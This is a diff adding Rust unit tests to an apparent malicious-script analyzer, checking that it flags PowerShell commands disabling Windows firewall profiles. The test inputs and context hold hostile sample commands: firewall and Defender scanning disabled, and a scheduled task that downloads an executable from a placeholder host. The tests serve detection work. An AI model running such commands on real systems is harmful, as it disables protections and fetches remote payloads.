@@ -30428,6 +30428,62 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
     }
 
     #[test]
+    fn powershell_firewall_profile_disable_emits_defender_evasion_trait() {
+        let script =
+            br#"powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "firewall-profile-disabled" && target == "Domain,Public,Private"
+            )),
+            "missing PowerShell firewall profile disable: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_firewall_profile_padded_disabled_value_emits_evasion_trait() {
+        let script =
+            br#"powershell -Command "Set-NetFirewallProfile -Profile Domain -Enabled 0x00000000"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "firewall-profile-disabled" && target == "Domain"
+            )),
+            "padded Set-NetFirewallProfile disabled value was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_firewall_profile_list_emits_each_disabled_profile() {
+        let script =
+            br#"powershell -Command "Set-NetFirewallProfile -Profile Domain, Public -Enabled False"
+"#;
+        let report = analyze(script, &Config::default());
+
+        for target in ["Domain", "Public"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DefenderEvasion { action, target: existing_target }
+                        if action == "firewall-profile-disabled" && existing_target == target
+                )),
+                "missing individual disabled firewall profile {target}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn powershell_scheduled_task_delayed_url_does_not_cross_cmd_separator() {
         let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/V:ON /c set U=https://ps-task.example/p.exe&&curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
 "#;
